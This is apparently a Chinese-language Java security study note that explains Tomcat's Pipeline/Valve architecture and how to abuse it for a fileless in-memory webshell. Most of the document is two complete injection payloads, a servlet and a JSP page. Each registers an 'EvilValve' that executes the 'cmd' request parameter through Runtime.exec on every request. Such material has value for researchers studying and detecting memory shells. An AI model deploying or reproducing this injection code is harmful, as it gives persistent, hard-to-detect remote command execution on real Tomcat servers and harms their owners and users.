---
created: '22/02/18'
title: Tomcat-Valve型内存马
tags:
  - java
  - java安全
  - 内存马
---
# Tomcat-Valve型内存马

## 参考文章
- https://su18.org/post/memory-shell/#tomcat-valve-%E5%86%85%E5%AD%98%E9%A9%AC

## 引子
实际上在我们调试Tomcat-Filter型内存马的时候，我们查看调用栈会发现一些有趣的东西:
![](https://gitee.com/guuest/images/raw/master/img/20220218104259.png)

我们会发现这里存在一堆的invoke方法的调用，那么这些Valve究竟是什么呢？


## Valve与Pipeline
> Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。
> 
> Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 `addValve` 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。

![](https://gitee.com/guuest/images/raw/master/img/20220218104446.png)

> Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及MBean 接口，使我们只需专注阀门的逻辑处理即可。

同时我们可以观察Valve的实现，比如StandardEngineValve:
```java
final class StandardEngineValve extends ValveBase {
//...
 public final void invoke(Request request, Response response)
       //...
    }
}
```
可以发现其直接继承了ValveBase，而且在invoke方法中我们能拿到request和response。

## 内存马实现流程分析
根据上述的描述我们发现，Valve也可能作为内存马，首先我们需要考虑如何拿到StandardPipeline，实际上根据我们调用栈和上文分析很容易发现，在StandardContext里就存在`getPipeline()`方法，所以我们老样子只需要拿到StandardContext即可。

最后总结下Filter型内存马(即动态创建filter)的步骤:
1. 获取StandardContext
2. 继承并编写一个恶意valve
3. 调用`StandardContext.addValve()`添加恶意valve实例

具体代码实现如下:
java版本:
```java
package top.longlone.servlet;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

class EvilValve extends ValveBase {

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("111");
        try {
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        } catch (Exception e) {

        }
    }
}

public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field reqF = req.getClass().getDeclaredField("request");
            reqF.setAccessible(true);
            Request request = (Request) reqF.get(req);
            StandardContext standardContext = (StandardContext) request.getContext();
            standardContext.getPipeline().addValve(new EvilValve());
            resp.getWriter().write("inject success");
        } catch (Exception e) {
        }
    }
}
```
在`System.out.println("111");`下断点调试,可以看到恶意Valve注入成功，AuthenticatorBase紧跟着的就是我们的EvilValve:
![](https://gitee.com/guuest/images/raw/master/img/20220218110100.png)

jsp版本:
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="javax.servlet.*" %>  
<%@ page import="javax.servlet.annotation.WebServlet" %>  
<%@ page import="javax.servlet.http.HttpServlet" %>  
<%@ page import="javax.servlet.http.HttpServletRequest" %>  
<%@ page import="javax.servlet.http.HttpServletResponse" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="org.apache.catalina.Wrapper" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="org.apache.catalina.valves.ValveBase" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
  
<%  
 class EvilValve extends ValveBase {  
  
 @Override  
 public void invoke(Request request, Response response) throws IOException, ServletException {  
 System.out.println("111");  
 try {  
 Runtime.getRuntime().exec(request.getParameter("cmd"));  
 } catch (Exception e) {  
  
 } } }%>  
  
<%  
 // 更简单的方法 获取StandardContext  
 Field reqF = request.getClass().getDeclaredField("request");  
 reqF.setAccessible(true);  
 Request req = (Request) reqF.get(request);  
 StandardContext standardContext = (StandardContext) req.getContext();  
  
 standardContext.getPipeline().addValve(new EvilValve());  
  
 out.println("inject success");  
%>
```